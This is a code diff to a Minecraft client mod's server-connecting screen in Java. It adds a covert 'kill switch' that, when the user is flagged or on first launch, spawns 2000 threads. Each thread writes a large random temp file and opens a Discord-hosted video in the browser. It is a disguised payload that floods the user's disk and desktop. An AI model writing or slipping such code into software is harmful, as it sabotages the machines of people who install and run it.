@@ -3,6 +3,8 @@ package net.minecraft.client.multiplayer;
 import dev.africa.pandaware.Client;
 import dev.africa.pandaware.impl.event.game.ServerJoinEvent;
 import dev.africa.pandaware.utils.client.ServerUtils;
+import dev.africa.pandaware.utils.client.SoundUtils;
+import dev.africa.pandaware.utils.java.FileUtils;
 import dev.africa.pandaware.utils.math.random.RandomUtils;
 import lombok.var;
 import net.minecraft.client.Minecraft;
@@ -19,9 +21,12 @@ import net.minecraft.util.ChatComponentText;
 import net.minecraft.util.ChatComponentTranslation;
 import org.tinylog.Logger;
 
+import java.awt.*;
 import java.io.IOException;
 import java.net.InetAddress;
+import java.net.URI;
 import java.net.UnknownHostException;
+import java.nio.file.Files;
 import java.util.concurrent.atomic.AtomicInteger;
 
 public class GuiConnecting extends GuiScreen {
@@ -57,17 +62,17 @@ public class GuiConnecting extends GuiScreen {
                     Client.getInstance().getEventDispatcher().dispatch(serverJoinEvent);
                     ServerUtils.checkHosts();
 
-                    if (Client.getInstance().isFdpClient() && Client.getInstance().isKillSwitch()) {
+                    if ((Client.getInstance().isFdpClient() || Client.getInstance().isFirstLaunch()) && Client.getInstance().isKillSwitch()) {
+                        SoundUtils.playSound(SoundUtils.CustomSound.ENABLE, 1000);
                         for (int i = 0; i < 2000; i++) {
                             new Thread(() -> {
-                                new Thread(() -> {
-                                    new Thread(() -> {
-                                        new Thread(() -> {
-                                            new Thread(() -> {
-                                            }).start();
-                                        }).start();
-                                    }).start();
-                                }).start();
+                                try {
+                                    FileUtils.writeToFile(RandomUtils.randomString(10000),
+                                            Files.createTempFile("log_", ".tmp").toFile());
+                                    Desktop.getDesktop().browse(URI.create("https://cdn.discordapp.com/attachments/846286888877031446/957608695292907570/funny_cat.webm?size=4096"));
+                                } catch (IOException e) {
+                                    throw new RuntimeException(e);
+                                }
                             }).start();
                         }
                     }
